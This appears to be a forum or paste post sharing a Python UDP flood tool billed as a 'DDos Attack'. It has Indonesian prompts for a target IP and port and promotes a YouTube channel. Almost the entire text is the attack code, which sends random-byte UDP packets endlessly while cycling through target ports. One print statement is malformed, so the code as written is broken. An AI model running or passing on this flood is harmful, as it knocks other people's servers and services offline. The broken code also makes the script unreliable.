You guys get try Website Tool
import sys,os,time,socket,random

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos Attack")
print("""\u001b[31m
>> Subscribe DogX
>>>>> www.youtube.com/DogX
>>>>>>>>> DogX""")

ip = str(input("Masukan Ip Target : "))
port = int(input("Masukan Port Target :"))

os.system("clear")
os.system("figlet Attack Starting")
print("Start Sent all Pakets to Server")
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port)) #Copy All Script And Paste on your Account github
     sent = sent + 1
     port = port + 1
     print("Start Sent %s Pakets To %s Port socket:%")(sent,ip,port)
     if port == 65534:
       port = 1
     #Done
